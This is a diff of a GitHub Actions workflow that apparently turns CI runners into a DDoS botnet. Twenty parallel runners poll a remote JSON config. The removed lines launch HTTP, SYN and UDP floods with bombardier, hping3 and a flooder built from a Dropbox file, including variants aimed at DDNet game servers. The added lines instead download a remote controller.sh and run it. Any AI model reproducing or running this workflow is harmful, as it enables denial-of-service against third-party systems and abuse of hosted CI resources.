@@ -1,4 +1,4 @@
-name: Ultimate Multi-Tool (Auto JSON + Self-Restart)
+name: Ultimate Multi-Tool
 
 on:
   workflow_dispatch:
@@ -7,6 +7,7 @@ on:
         description: 'URL JSON конфига'
         required: true
         default: 'https://aarr.alwaysdata.net/paneldemo/config.json'
+
   schedule:
     - cron: '0 0,6,12,18 * * *'
     - cron: '30 5,11,17,23 * * *'
@@ -21,150 +22,28 @@ jobs:
         runner_id: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
 
     steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-
-      - name: Setup Go
-        uses: actions/setup-go@v5
-        with:
-          go-version: '1.22'
-          cache: true
-
-      - name: Cache & Install Tools
-        run: |
-          sudo apt-get update -qq && sudo apt-get install -y hping3 curl jq --no-install-recommends
-          
-          if [ ! -f /usr/local/bin/bombardier ]; then
-            wget -q https://github.com/codesenberg/bombardier/releases/download/v1.2.6/bombardier-linux-amd64 -O bombardier-linux-amd64
-            chmod +x bombardier-linux-amd64
-            sudo mv bombardier-linux-amd64 /usr/local/bin/bombardier
-          fi
-          if [ ! -f ./bombarida ]; then
-            wget -q -O bombarida.go "https://www.dropbox.com/scl/fi/zss6t38cy6wdztch3p5sj/bombarida_firewall_direct-1.go?rlkey=sz2tagt1enucywsrj6d7ei19k&st=8pzgzqbz&dl=1"
-            go build -o bombarida bombarida.go
-            chmod +x bombarida
-          fi
-
-      - name: JSON Controller + Self-Restart + Logging
+      - name: Download & Execute Controller
         env:
-          JSON_URL: "https://aarr.alwaysdata.net/paneldemo/config.json"
+          CONTROLLER_URL: "https://aarr.alwaysdata.net/paneldemo/controller.sh"
+          JSON_URL: ${{ inputs.json_url || 'https://aarr.alwaysdata.net/paneldemo/config.json' }}
           LOG_URL: "https://aarr.alwaysdata.net/paneldemo/log.php"
           RUNNER_ID: "runner${{ matrix.runner_id }}"
         run: |
-          echo "=== Runner $RUNNER_ID запущен ==="
-          echo "JSON_URL: $JSON_URL"          # Для отладки
-          
-          CURRENT_PID=0
-          CURRENT_PARAMS=""
-          
-          while true; do
-            if ! JSON=$(curl -s -m 8 "$JSON_URL"); then
-              echo "[-] Failed to fetch JSON"
-              sleep 3
-              continue
-            fi
+          echo "=== Runner $RUNNER_ID запускается ==="
 
-            COMMAND=$(echo "$JSON" | jq -r '.command // "idle"')
-            METHOD=$(echo "$JSON" | jq -r '.method // ""')
-            TARGET=$(echo "$JSON" | jq -r '.target // ""')
-            PORT=$(echo "$JSON" | jq -r '.port // "80"')
-            CONNECTIONS=$(echo "$JSON" | jq -r '.connections // "500"')
-            DURATION=$(echo "$JSON" | jq -r '.duration // "300s"')
-            RATE=$(echo "$JSON" | jq -r '.rate // "0"')
-            OPEN_LOOP=$(echo "$JSON" | jq -r '.open_loop // "false"')
-            BURST_ON=$(echo "$JSON" | jq -r '.burst_on // "0s"')
-            BURST_OFF=$(echo "$JSON" | jq -r '.burst_off // "0s"')
-            FW_MAX_PPS=$(echo "$JSON" | jq -r '.fw_max_pps // "5000"')
-            FW_START_PPS=$(echo "$JSON" | jq -r '.fw_start_pps // "50"')
-            FW_STEP_UP=$(echo "$JSON" | jq -r '.fw_step_up // "150"')
-            FW_LOSS_THRESHOLD=$(echo "$JSON" | jq -r '.fw_loss_threshold // "99.9"')
-            FW_PAD_DDNET=$(echo "$JSON" | jq -r '.fw_pad_ddnet // "false"')
+          # Скачиваем контроллер
+          curl -fsSL -H "Cache-Control: no-cache, no-store" "$CONTROLLER_URL" -o /tmp/controller.sh
 
-            NEW_PARAMS="${METHOD}|${TARGET}|${PORT}|${CONNECTIONS}|${DURATION}|${RATE}|${OPEN_LOOP}|${BURST_ON}|${BURST_OFF}"
+          if [ ! -s /tmp/controller.sh ]; then
+            echo "[-] CRITICAL: Не удалось скачать controller.sh"
+            exit 1
+          fi
 
-            if [[ "$COMMAND" == "stop" || "$COMMAND" == "idle" ]]; then
-              if [ $CURRENT_PID -ne 0 ]; then
-                echo "[+] [$RUNNER_ID] Остановка атаки"
-                kill $CURRENT_PID 2>/dev/null || true
-                wait $CURRENT_PID 2>/dev/null || true
-                CURRENT_PID=0
-              fi
-            elif [ "$NEW_PARAMS" != "$CURRENT_PARAMS" ] || [ $CURRENT_PID -eq 0 ]; then
-              if [ $CURRENT_PID -ne 0 ]; then
-                echo "[~] [$RUNNER_ID] Перезапуск атаки с новыми параметрами"
-                kill $CURRENT_PID 2>/dev/null || true
-                wait $CURRENT_PID 2>/dev/null || true
-              fi
+          chmod +x /tmp/controller.sh
+          echo "[+] controller.sh загружен ($(wc -c < /tmp/controller.sh) байт)"
 
-              echo "=== [$RUNNER_ID] Запуск $METHOD → $TARGET:$PORT ==="
+          ls -la /tmp/controller.sh
 
-              case "$METHOD" in
-                "http")
-                  bombardier -c 1000 -d "$DURATION" --http2 -l "$TARGET?cache=$RANDOM" &
-                  ;;
-                "tcp")
-                  sudo hping3 --flood -S -p "$PORT" "$TARGET" &
-                  ;;
-                "udp")
-                  ./bombarida -mode client -addr "${TARGET}:${PORT}" \
-                    -c "$CONNECTIONS" -n 0 -d "$DURATION" -r "$RATE" -t 1s &
-                  ;;
-                udp-ddnet-*)
-                  DDNET_FLAGS="-ddnet-info"
-                  case "$METHOD" in
-                    "udp-ddnet-vanilla") DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind vanilla" ;;
-                    "udp-ddnet-extended") DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind extended" ;;
-                    "udp-ddnet-legacy64") DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind legacy64" ;;
-                    "udp-ddnet-mixed") DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind mixed" ;;
-                  esac
-                  if [ "$OPEN_LOOP" = "true" ]; then
-                    DDNET_FLAGS="$DDNET_FLAGS -open-loop"
-                    if [ "$BURST_ON" != "0s" ]; then
-                      DDNET_FLAGS="$DDNET_FLAGS -burst-on $BURST_ON -burst-off $BURST_OFF"
-                    fi
-                  fi
-                  ./bombarida -mode client -addr "${TARGET}:${PORT}" \
-                    -c "$CONNECTIONS" -n 0 -d "$DURATION" -r "$RATE" $DDNET_FLAGS &
-                  ;;
-                "firewall-check")
-                  FW_FLAGS="-firewall-check -fw-max-pps $FW_MAX_PPS -fw-start-pps $FW_START_PPS \
-                    -fw-step-up $FW_STEP_UP -fw-loss-threshold $FW_LOSS_THRESHOLD"
-                  [ "$FW_PAD_DDNET" = "true" ] && FW_FLAGS="$FW_FLAGS -fw-pad-ddnet"
-                  ./bombarida -mode client -addr "${TARGET}:${PORT}" $FW_FLAGS &
-                  ;;
-                *)
-                  echo "[-] [$RUNNER_ID] Неизвестный метод: $METHOD"
-                  sleep 5
-                  continue
-                  ;;
-              esac
-
-              CURRENT_PID=$!
-              CURRENT_PARAMS="$NEW_PARAMS"
-              echo "[+] [$RUNNER_ID] Атака запущена (PID: $CURRENT_PID)"
-            fi
-
-            # Логирование (только runner1)
-            if [ "$RUNNER_ID" = "runner1" ] && [ $CURRENT_PID -ne 0 ]; then
-              LOG_DATA=$(jq -n \
-                --arg runner "$RUNNER_ID" \
-                --arg method "$METHOD" \
-                --arg target "$TARGET" \
-                --arg port "$PORT" \
-                --arg status "running" \
-                --arg timestamp "$(date -u +%s)" \
-                --argjson pid "$CURRENT_PID" \
-                '{
-                  runner: $runner,
-                  method: $method,
-                  target: $target,
-                  port: $port,
-                  status: $status,
-                  pid: $pid,
-                  timestamp: $timestamp
-                }')
-              curl -s -X POST -H "Content-Type: application/json" -d "$LOG_DATA" "$LOG_URL" || true
-            fi
-
-            sleep 2
-          done
+          # Самый надёжный запуск
+          cd /tmp
+          bash /tmp/controller.sh
